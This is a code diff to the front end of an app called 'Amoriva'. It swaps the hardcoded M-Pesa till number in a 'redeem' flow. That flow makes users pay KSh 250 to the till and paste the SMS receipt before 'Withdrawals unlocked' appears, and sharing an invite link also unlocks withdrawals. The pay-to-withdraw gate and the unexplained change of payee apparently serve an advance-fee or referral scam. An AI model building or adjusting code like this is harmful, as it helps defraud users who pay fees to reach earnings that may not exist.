@@ -417,7 +417,7 @@ function renderNav(active) {
 function initRedeem() {
   const uid = CURRENT.user && CURRENT.user.uid;
   if (!uid) return;
-  const code = 9283776;//sectionCode(uid, "redeem");
+  const code = 5274876;//sectionCode(uid, "redeem");
   const sheet = document.createElement("div");
   sheet.className = "sheet-bg";
   sheet.id = "redeemSheet";
@@ -436,7 +436,7 @@ function initRedeem() {
       <div class="inv-steps">
         <div class="inv-step"><span class="sn">1</span> Open M-Pesa menu on your mobile phone</div>
         <div class="inv-step"><span class="sn">2</span> Go to lipa na M-PESA → Choose Buy Goods and Services</div>
-        <div class="inv-step"><span class="sn">3</span> Enter Till Number:  <span class="code">9283776</span></div>
+        <div class="inv-step"><span class="sn">3</span> Enter Till Number:  <span class="code">5274876</span></div>
         <div class="inv-step"><span class="sn">4</span> Enter Amount: <span class="code">KSh 250</span></div>
         <div class="inv-step"><span class="sn">5</span> Enter your M-Pesa PIN and complete transaction</div>
         <div class="inv-step"><span class="sn">6</span> Copy and paste the full M-Pesa SMS confirmation message below to verify</div>
@@ -497,11 +497,11 @@ function initRedeem() {
     if (!codeValid("redeem", v)) { toast("That message isn't valid.", true); return; }
     unlockRedeem(); toast("Withdrawals unlocked!");
   };
-  $("#rdCopy").onclick = () => { navigator.clipboard?.writeText("9283776"); toast("Till number copied to clipboard!"); };
+  $("#rdCopy").onclick = () => { navigator.clipboard?.writeText("5274876"); toast("Till number copied to clipboard!"); };
   $("#rdShare").onclick = () => {
     const data = { title: "Amoriva", text: `Join me on Amoriva! Use my invite code: ${code}`, url: location.origin + "/index.html" };
     if (navigator.share) navigator.share(data).then(unlockRedeem).catch(() => {});
-    else { navigator.clipboard?.writeText("9283776"); toast("Till number copied"); }
+    else { navigator.clipboard?.writeText("5274876"); toast("Till number copied"); }
   };
 
   const showSuccess = (on) => {
